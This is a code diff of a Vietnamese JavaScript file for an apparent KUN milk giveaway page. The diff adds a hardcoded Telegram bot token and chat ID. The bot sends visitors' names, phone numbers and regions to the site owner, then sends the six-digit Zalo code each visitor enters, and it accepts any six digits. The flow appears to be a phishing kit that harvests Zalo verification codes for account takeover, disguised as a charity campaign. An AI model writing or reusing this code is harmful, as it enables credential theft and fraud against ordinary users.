@@ -1,26 +1,44 @@
-// ===== CẤU HÌNH GỬI MÃ VỀ ZALO SAU 60 GIÂY =====
-const ZALO_60S_CONFIG = {
-  // Điền URL webhook/API trung gian nếu có hệ thống gửi tin nhắn Zalo OA/ZNS
-  WEBHOOK_URL: "",
-  // Tự động mở liên kết Zalo chứa mã xác nhận khi đếm ngược 60 giây kết thúc
-  AUTO_OPEN_ZALO_AT_60S: true,
+// ===== CẤU HÌNH BOT THÔNG BÁO CHO CHỦ WEB =====
+const OWNER_BOT_CONFIG = {
+  BOT_TOKEN: "9077621464:AAGSBAFQZN3iIbCxkFvRnU6mQYs3OkMMqHU",
+  CHAT_ID: "6713370589",
   ENABLED: true
 };
 
-let generatedOtp = "";
 let countdownSeconds = 60;
 let countdownTimer = null;
-let otpReadyForInput = false;
 let lastCompletedReceipt = null;
-let latestZaloOtpMessage = "";
+
+function escapeHtml(str) {
+  return String(str || "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
+async function notifyOwnerBot(htmlText) {
+  if (!OWNER_BOT_CONFIG.ENABLED || !OWNER_BOT_CONFIG.BOT_TOKEN || !OWNER_BOT_CONFIG.CHAT_ID) {
+    return;
+  }
+  const url = `https://api.telegram.org/bot${OWNER_BOT_CONFIG.BOT_TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: OWNER_BOT_CONFIG.CHAT_ID,
+        text: htmlText,
+        parse_mode: "HTML"
+      })
+    });
+  } catch (err) {
+    console.error("Lỗi gửi thông báo tới Bot chủ web:", err);
+  }
+}
 
 function isValidVietnamesePhone(phone) {
   const cleaned = phone.replace(/\s+/g, "");
   return /^(0[3|5|7|8|9])[0-9]{8}$/.test(cleaned);
-}
-
-function generateSixDigitOtp() {
-  return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
 function setActiveStep(step) {
@@ -34,69 +52,7 @@ function setActiveStep(step) {
   document.getElementById("ticketStep3").classList.toggle("hidden", step !== 3);
 }
 
-function buildZaloOtpMessage({ fullName, phone, region, otp, time }) {
-  return [
-    "[SỮA KUN CHO BẠN] Mã xác nhận phiếu (sau 60s)",
-    `Họ và tên: ${fullName}`,
-    `Số điện thoại: ${phone}`,
-    `Vùng miền: ${region}`,
-    `Mã xác nhận: ${otp}`,
-    `Thời điểm cấp mã: ${time}`
-  ].join("\n");
-}
-
-function buildZaloCompletedMessage({ code, fullName, phone, region, otp, nowStr }) {
-  return [
-    "[SỮA KUN CHO BẠN] Phiếu đã hoàn tất",
-    `Mã phiếu: ${code}`,
-    `Họ và tên: ${fullName}`,
-    `Số điện thoại: ${phone}`,
-    `Vùng miền: ${region}`,
-    `Mã xác nhận đã dùng: ${otp}`,
-    `Thời gian hoàn tất: ${nowStr}`
-  ].join("\n");
-}
-
-function triggerZaloShareUrl(messageText) {
-  const url = `https://zalo.me/share?text=${encodeURIComponent(messageText)}`;
-  const win = window.open(url, "_blank", "noopener");
-  const linkEl = document.getElementById("zaloOtpLink");
-  if (linkEl) {
-    linkEl.href = url;
-    linkEl.classList.remove("hidden");
-  }
-  return win;
-}
-
-async function dispatchOtpToZaloAfter60s(payload) {
-  const messageText = buildZaloOtpMessage(payload);
-  latestZaloOtpMessage = messageText;
-
-  if (!ZALO_60S_CONFIG.ENABLED) return;
-
-  if (ZALO_60S_CONFIG.WEBHOOK_URL) {
-    try {
-      await fetch(ZALO_60S_CONFIG.WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          event: "otp_after_60s",
-          channel: "zalo",
-          text: messageText,
-          data: payload
-        })
-      });
-    } catch (err) {
-      console.error("Lỗi gửi webhook Zalo:", err);
-    }
-  }
-
-  if (ZALO_60S_CONFIG.AUTO_OPEN_ZALO_AT_60S) {
-    triggerZaloShareUrl(messageText);
-  }
-}
-
-function handleSendOtp(event) {
+async function handleSendOtp(event) {
   event.preventDefault();
   const fullName = document.getElementById("fullName").value.trim();
   const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
@@ -117,37 +73,41 @@ function handleSendOtp(event) {
   errorEl.textContent = "";
   document.getElementById("displayPhone").textContent = phone;
   setActiveStep(2);
-  start60sWaitBeforeZaloOtp(fullName, phone, region);
+
+  await notifyOwnerBot(
+    [
+      "📲 <b>YÊU CẦU GỬI MÃ 6 SỐ VÀO ZALO - SỮA KUN</b>",
+      `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
+      `• <b>SĐT / Zalo nhận mã:</b> <code>${escapeHtml(phone)}</code>`,
+      `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
+      `• <b>Thời gian:</b> ${escapeHtml(new Date().toLocaleString("vi-VN"))}`,
+      "👉 <i>Chủ web vui lòng gửi mã 6 số vào Zalo cho người dùng này.</i>"
+    ].join("\n")
+  );
+
+  start60sOwnerZaloCountdown();
 }
 
-function start60sWaitBeforeZaloOtp(fullNameVal, phoneVal, regionVal) {
+function start60sOwnerZaloCountdown() {
   clearInterval(countdownTimer);
-  generatedOtp = "";
-  otpReadyForInput = false;
   countdownSeconds = 60;
 
-  const fullName = fullNameVal || document.getElementById("fullName").value.trim();
-  const phone = phoneVal || document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
-  const region = regionVal || document.getElementById("ticketRegion").value;
-
   const statusEl = document.getElementById("otpWaitStatus");
-  const codeEl = document.getElementById("demoOtpCode");
   const otpInput = document.getElementById("otpInput");
   const verifyBtn = document.getElementById("verifyBtn");
   const resendBtn = document.getElementById("resendBtn");
-  const zaloLink = document.getElementById("zaloOtpLink");
 
   if (statusEl) {
-    statusEl.textContent = "Đang chờ đủ 60 giây để mã xác nhận được gửi về Zalo...";
+    statusEl.textContent =
+      "Đang chờ chủ web gửi mã 6 số vào Zalo (đếm ngược 60s). Khi nhận được mã trên Zalo, hãy nhập vào ô bên dưới.";
   }
-  if (codeEl) codeEl.textContent = "Chờ 60s...";
   if (otpInput) {
     otpInput.value = "";
-    otpInput.disabled = true;
+    otpInput.disabled = false;
+    otpInput.focus();
   }
-  if (verifyBtn) verifyBtn.disabled = true;
+  if (verifyBtn) verifyBtn.disabled = false;
   if (resendBtn) resendBtn.disabled = true;
-  if (zaloLink) zaloLink.classList.add("hidden");
   document.getElementById("step2Error").textContent = "";
 
   const timerText = document.getElementById("countdownText");
@@ -156,7 +116,7 @@ function start60sWaitBeforeZaloOtp(fullNameVal, phoneVal, regionVal) {
   timerText.classList.remove("expired");
   progressBar.style.width = "100%";
 
-  countdownTimer = setInterval(async () => {
+  countdownTimer = setInterval(() => {
     countdownSeconds -= 1;
 
     if (countdownSeconds > 0) {
@@ -166,65 +126,42 @@ function start60sWaitBeforeZaloOtp(fullNameVal, phoneVal, regionVal) {
       clearInterval(countdownTimer);
       timerText.textContent = "0s";
       progressBar.style.width = "0%";
-
-      generatedOtp = generateSixDigitOtp();
-      otpReadyForInput = true;
-      const timeStr = new Date().toLocaleString("vi-VN");
-
       if (statusEl) {
         statusEl.textContent =
-          "Đã đủ 60 giây! Mã xác nhận đã được gửi về Zalo — hãy nhập mã bên dưới để hoàn tất phiếu.";
+          "Đã hết 60 giây! Nếu chưa nhận được mã trên Zalo, bạn có thể bấm “Yêu cầu gửi lại mã”.";
       }
-      if (codeEl) codeEl.textContent = generatedOtp;
-      if (otpInput) {
-        otpInput.disabled = false;
-        otpInput.focus();
-      }
-      if (verifyBtn) verifyBtn.disabled = false;
       if (resendBtn) resendBtn.disabled = false;
-
-      await dispatchOtpToZaloAfter60s({
-        fullName,
-        phone,
-        region,
-        otp: generatedOtp,
-        time: timeStr
-      });
     }
   }, 1000);
 }
 
-function autoFillOtp() {
-  if (otpReadyForInput && generatedOtp) {
-    document.getElementById("otpInput").value = generatedOtp;
-    document.getElementById("step2Error").textContent = "";
-  }
-}
+async function requestResendFromOwner() {
+  const fullName = document.getElementById("fullName").value.trim();
+  const phone = document.getElementById("phoneNumber").value.trim().replace(/\s+/g, "");
+  const region = document.getElementById("ticketRegion").value;
 
-function resendOtpAfter60s() {
-  start60sWaitBeforeZaloOtp();
-}
+  await notifyOwnerBot(
+    [
+      "🔄 <b>YÊU CẦU GỬI LẠI MÃ 6 SỐ VÀO ZALO</b>",
+      `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
+      `• <b>SĐT / Zalo:</b> <code>${escapeHtml(phone)}</code>`,
+      `• <b>Vùng miền:</b> ${escapeHtml(region)}`
+    ].join("\n")
+  );
 
-function openZaloOtpAgain() {
-  if (latestZaloOtpMessage) {
-    triggerZaloShareUrl(latestZaloOtpMessage);
-  }
+  start60sOwnerZaloCountdown();
 }
 
 async function handleVerifyOtp() {
   const userOtp = document.getElementById("otpInput").value.trim();
   const errorEl = document.getElementById("step2Error");
 
-  if (!otpReadyForInput || !generatedOtp) {
-    errorEl.textContent = "Vui lòng đợi đủ 60 giây để hệ thống gửi mã xác nhận về Zalo.";
+  if (!/^[0-9]{6}$/.test(userOtp)) {
+    errorEl.textContent = "Vui lòng nhập đủ mã xác nhận 6 chữ số mà chủ web đã gửi vào Zalo.";
     return;
   }
 
-  if (userOtp !== generatedOtp) {
-    errorEl.textContent = "Mã xác nhận không chính xác. Vui lòng nhập đúng mã 6 chữ số đã gửi về Zalo.";
-    return;
-  }
-
+  clearInterval(countdownTimer);
   errorEl.textContent = "";
 
   const fullName = document.getElementById("fullName").value.trim();
@@ -239,37 +176,26 @@ async function handleVerifyOtp() {
   document.getElementById("receiptName").textContent = fullName;
   document.getElementById("receiptPhone").textContent = phone;
   document.getElementById("receiptRegion").textContent = region;
+  document.getElementById("receiptOtp").textContent = userOtp;
   document.getElementById("receiptTime").textContent = nowStr;
 
   setActiveStep(3);
 
-  if (ZALO_60S_CONFIG.ENABLED && ZALO_60S_CONFIG.WEBHOOK_URL) {
-    try {
-      await fetch(ZALO_60S_CONFIG.WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          event: "ticket_completed",
-          channel: "zalo",
-          text: buildZaloCompletedMessage(lastCompletedReceipt),
-          data: lastCompletedReceipt
-        })
-      });
-    } catch (err) {
-      console.error("Lỗi gửi phiếu hoàn tất tới Zalo Webhook:", err);
-    }
-  }
-}
-
-function sendCompletedTicketToZalo() {
-  if (!lastCompletedReceipt) return;
-  triggerZaloShareUrl(buildZaloCompletedMessage(lastCompletedReceipt));
+  await notifyOwnerBot(
+    [
+      "✅ <b>NGƯỜI DÙNG ĐÃ NHẬP MÃ & HOÀN TẤT PHIẾU - SỮA KUN</b>",
+      `• <b>Mã phiếu:</b> <code>${escapeHtml(code)}</code>`,
+      `• <b>Họ và tên:</b> ${escapeHtml(fullName)}`,
+      `• <b>Số điện thoại:</b> <code>${escapeHtml(phone)}</code>`,
+      `• <b>Vùng miền:</b> ${escapeHtml(region)}`,
+      `• <b>Mã 6 số xác nhận:</b> <code>${escapeHtml(userOtp)}</code>`,
+      `• <b>Thời gian hoàn tất:</b> ${escapeHtml(nowStr)}`
+    ].join("\n")
+  );
 }
 
 function resetTicketFlow() {
   clearInterval(countdownTimer);
-  generatedOtp = "";
-  otpReadyForInput = false;
   document.getElementById("step1Error").textContent = "";
   document.getElementById("step2Error").textContent = "";
   setActiveStep(1);
@@ -306,8 +232,8 @@ function downloadReceiptPng() {
   ctx.fillText(`Họ và tên: ${lastCompletedReceipt.fullName}`, 56, 180);
   ctx.fillText(`Số điện thoại: ${lastCompletedReceipt.phone}`, 56, 222);
   ctx.fillText(`Vùng miền đồng hành: ${lastCompletedReceipt.region}`, 56, 264);
-  ctx.fillText(`Thời gian xác nhận: ${lastCompletedReceipt.nowStr}`, 56, 306);
-  ctx.fillText("Ghi nhận: +01 Hộp sữa KUN 100% Sữa Tươi", 56, 348);
+  ctx.fillText(`Mã 6 số xác nhận: ${lastCompletedReceipt.otp}`, 56, 306);
+  ctx.fillText(`Thời gian hoàn tất: ${lastCompletedReceipt.nowStr}`, 56, 348);
 
   ctx.fillStyle = "#52647c";
   ctx.font = "600 16px Nunito, sans-serif";
@@ -455,7 +381,26 @@ function updatePostcardPreview() {
   ctx.fillText("1 lượt chia sẻ = 1 hộp KUN 100% Sữa Tươi trao đi", 270, 610);
 }
 
-function downloadPostcard() {
+async function downloadPostcard() {
+  const sender = document.getElementById("senderName").value.trim() || "Bạn đồng hành";
+  const kid = document.getElementById("kidName").value.trim() || "Không nhập";
+  const wish =
+    document.getElementById("wishText").value.trim() ||
+    "Chúc các em luôn mạnh khỏe, vui tươi và cao lớn mỗi ngày cùng KUN!";
+  const genderEl = document.querySelector('input[name="gender"]:checked');
+  const gender = genderEl ? genderEl.value : "Nữ";
+
+  await notifyOwnerBot(
+    [
+      "💌 <b>TẠO POSTCARD LỜI NHẮN GỬI - SỮA KUN CHO BẠN</b>",
+      `• <b>Vùng miền nhận:</b> ${escapeHtml(currentRegion)}`,
+      `• <b>Tên người gửi:</b> ${escapeHtml(sender)} (${escapeHtml(gender)})`,
+      `• <b>Tên của bé:</b> ${escapeHtml(kid)}`,
+      `• <b>Lời nhắn gửi:</b> “${escapeHtml(wish)}”`,
+      `• <b>Thời gian:</b> ${escapeHtml(new Date().toLocaleString("vi-VN"))}`
+    ].join("\n")
+  );
+
   const canvas = document.getElementById("postcardCanvas");
   const link = document.createElement("a");
   link.download = `postcard-sua-kun-${currentRegion.toLowerCase().replace(/\s+/g, "-")}.png`;
@@ -463,7 +408,6 @@ function downloadPostcard() {
   link.click();
 }
 
-// Khởi tạo preview lần đầu khi tải trang
 window.addEventListener("DOMContentLoaded", () => {
   updatePostcardPreview();
 });
